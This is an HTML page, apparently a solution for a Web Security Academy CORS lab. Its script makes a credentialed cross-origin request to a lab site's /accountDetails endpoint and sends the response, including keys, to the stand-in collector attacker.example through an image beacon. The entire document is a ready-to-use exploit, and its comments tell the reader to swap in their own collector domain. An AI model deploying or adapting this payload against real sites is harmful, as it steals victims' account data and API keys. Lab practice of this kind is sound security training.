<!doctype html>
<html>
  <body>
    <script>
      // Initialize the XMLHttpRequest object and the application base URL
      var req = new XMLHttpRequest();
      var url = "https://0a3800a30493bae484aa2f7a002a00ce.web-security-academy.net";

      // When the request loads, run retrieveKeys
      req.onload = retrieveKeys;

      // Open GET request to /accountDetails
      req.open('GET', url + "/accountDetails", true);

      // Allow passing credentials (cookies)
      req.withCredentials = true;

      // Send the request
      req.send(null);

      // On success, exfiltrate the response to your collector using an image beacon
      function retrieveKeys() {
        try {
          var data = encodeURIComponent(this.responseText || '');
          // replace attacker.example with your collector domain
          var img = new Image();
          img.src = 'https://attacker.example/collect?data=' + data;
          // append to body to ensure request is sent (not strictly necessary)
          document.body.appendChild(img);
          console.log('exfiltrated, preview:', this.responseText && this.responseText.slice(0,200));
        } catch (e) {
          console.error('retrieveKeys error', e);
        }
      }
    </script>
  </body>
</html>






